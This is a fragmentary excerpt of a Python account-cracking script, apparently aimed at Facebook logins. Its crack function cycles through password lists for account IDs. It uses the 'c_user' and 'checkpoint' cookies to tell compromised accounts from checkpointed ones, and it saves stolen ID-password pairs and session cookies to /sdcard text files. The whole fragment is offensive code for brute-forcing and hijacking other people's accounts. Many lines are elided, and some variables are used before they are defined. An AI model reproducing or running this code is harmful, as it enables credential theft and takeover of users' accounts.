...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[sujalxgod-HAKKU] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				cek_apk(kuki)
				open('/sdcard/sujalxgod-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}HAKKU-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/sujalxgod-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("sujalxgod")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("sujalxgod")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
